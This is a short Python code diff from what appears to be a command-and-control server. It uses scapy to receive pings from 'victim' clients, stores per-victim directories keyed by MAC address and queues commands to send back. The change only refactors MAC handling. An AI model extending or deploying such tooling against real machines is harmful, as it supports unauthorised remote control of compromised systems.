@@ -4,6 +4,7 @@ import os
 
 from scapy.all import *
 from utils.request_type import RequestType
+from utils.mac import Mac
 from command.cmdparser import CommandParser
 
 class DataReceiver():
@@ -26,10 +27,10 @@ class DataReceiver():
     def _receive_ping(self, pkt):
         # Fetch given command that should be sent to the client
         print('ping')
-        victim_mac = pkt.getlayer(Ether).src
+        victim_mac = Mac(pkt.getlayer(Ether).src)
 
         # If client connecting for first time, create new dir for it
-        victim_dir = self.rel_path + victim_mac
+        victim_dir = self.rel_path + str(victim_mac)
         if not os.path.exists(victim_dir):
             self._init_victim_dir(victim_dir)
 
